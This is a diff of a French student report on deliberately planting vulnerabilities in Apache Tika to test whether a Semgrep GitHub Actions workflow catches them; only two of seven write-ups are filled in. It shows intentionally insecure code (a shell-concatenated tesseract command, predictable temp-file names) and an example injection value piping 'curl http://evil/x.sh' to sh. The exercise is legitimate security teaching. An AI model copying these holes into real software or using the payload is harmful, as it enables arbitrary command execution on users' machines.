@@ -1,7 +1,7 @@
 # Tâche 3
 
-Binôme : NOM1 et NOM2
-Dépôt du cas d'étude (Tika) : <lien du dépôt>
+Binôme : NOM1 et NOM2\
+Dépôt du cas d'étude (Tika) : <lien du dépôt>\
 Workflow modifié : <lien vers le fichier .yml>
 
 ## 1. Workflow GitHub Actions
@@ -44,40 +44,92 @@ On a testé le workflow dans trois situations :
 
 Liste rapide :
 
-1. <type> dans `<fichier>`
-2. <type> dans `<fichier>`
-3. <type> dans `<fichier>`
-4. <type> dans `<fichier>`
-5. <type> dans `<fichier>`
-6. <type> dans `<fichier>`
-7. <type> dans `<fichier>`
+1. Injection de commande OS (CWE-78) dans `TesseractOCRParser.java`
+2. Aléa non cryptographique (CWE-330) dans `TemporaryResources.java`
+3. Permissions de fichier trop larges (CWE-732) dans `TemporaryResources.java`
+4. Validation de certificat TLS désactivée (CWE-295) dans `NetworkParser.java`
+5. Désérialisation de données non fiables (CWE-502) dans `JsonMetadata.java`
+6. Hachage cassé MD5 (CWE-328) dans `PDMetadataExtractor.java`
+7. Entités externes XML, XXE (CWE-611) dans `AbstractOOXMLExtractor.java`
 
-### 2.1 <Type de vulnérabilité> (CWE-XXX)
 
-**Fichier :** `<chemin>`
-**Pourquoi ce fichier :** (une ou deux phrases)
+### 2.1 Injection de commande (CWE-78)
+
+**Fichier :** `tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-ocr-module/src/main/java/org/apache/tika/parser/ocr/TesseractOCRParser.java`, méthode `preloadLangs()`
+**Pourquoi ce fichier :** le parseur OCR est l'un des rares endroits où Tika lance un programme externe
+(`tesseract`). Tika y a déjà eu une vraie faille de ce type..
 
 Code avant :
 
 ```java
+String[] args = new String[]{defaultConfig.getTesseractPath() + getTesseractProg(), "--list-langs"};
+ProcessBuilder pb = new ProcessBuilder(args);
+setEnv(pb);
+...
+process = pb.start();
 ```
 
 Code après :
 
 ```java
+String cmd = defaultConfig.getTesseractPath() + getTesseractProg() + " --list-langs";
+...
+process = java.lang.Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
 ```
 
-**Pourquoi c'est vulnérable :** (expliquer le problème et comment on pourrait l'exploiter)
+**Pourquoi c'est vulnérable :** avant, le programme était lancé directement avec un tableau d'arguments, sans shell.
+Maintenant, le chemin de Tesseract, qui vient de la configuration, est concaténé dans une ligne de commande
+interprétée par `sh -c`. Une valeur comme `tesseractPath = "/tmp/;curl http://evil/x.sh|sh;"` fait exécuter des
+commandes arbitraires avec les droits du processus Tika.
 
-**Résultat Semgrep :** règle `<id>`, ligne <n>.
+**Résultat Semgrep :** règle `java.lang.security.audit.command-injection-formatted-runtime-call`, ERROR, ligne 736.
 
 ```text
-extrait de la sortie
+A formatted or concatenated string was detected as input to a java.lang.Runtime call.
+This is dangerous if a variable is controlled by user input and could result in a
+command injection.
 ```
 
-### 2.2 <Type de vulnérabilité> (CWE-XXX)
+### 2.2 Aléa non cryptographique (CWE-330)
 
-(Même structure que ci-dessus. Répéter jusqu'à la vulnérabilité 7.)
+**Fichier :** `tika-core/src/main/java/org/apache/tika/io/TemporaryResources.java`, nouvelle méthode `createSharedTempFile(String suffix)`
+**Pourquoi ce fichier :** `TemporaryResources` est la classe qui crée les fichiers temporaires dans lesquels Tika
+copie les documents à analyser ; une méthode « fichier temporaire partagé avec un programme externe » y est naturelle.
+
+Code avant : la méthode n'existait pas (on utilisait `Files.createTempFile`, qui choisit un nom avec `SecureRandom`).
+
+Code après :
+
+```java
+String name = "apache-tika-shared-" + Long.toHexString(new Random().nextLong()) + actualSuffix;
+final Path path = Files.createFile(dir.resolve(name));
+```
+
+**Pourquoi c'est vulnérable :** `java.util.Random` est un générateur prévisible : on peut retrouver sa graine à
+partir de quelques valeurs, et par défaut elle dépend de l'horloge. Dans le dossier temporaire partagé (`/tmp`), un
+autre utilisateur de la machine peut deviner le nom et créer ce fichier, ou un lien symbolique, avant Tika : déni de
+service (`FileAlreadyExistsException`) ou détournement du fichier.
+
+**Résultat Semgrep :** règle `java.lang.security.audit.crypto.weak-random`, WARNING, ligne 126.
+
+```text
+Detected use of the functions `Math.random()` or `java.util.Random()`. These are both
+not cryptographically strong random number generators (RNGs).
+```
+
+### 2.3
+
+
+### 2.4
+
+
+### 2.5
+
+
+### 2.6
+
+
+### 2.7
 
 ## 3. Comparaison des rapports Semgrep
 
@@ -123,3 +175,6 @@ Les nouveaux résultats correspondent à nos vulnérabilités :
 ## 5. Limites
 
 (Ce qui ne marche pas parfaitement : faux négatifs de Semgrep, temps d'exécution, façons de contourner la vérification, etc.)
+
+
+## 6. Déclaration d'utilisation de l'IA
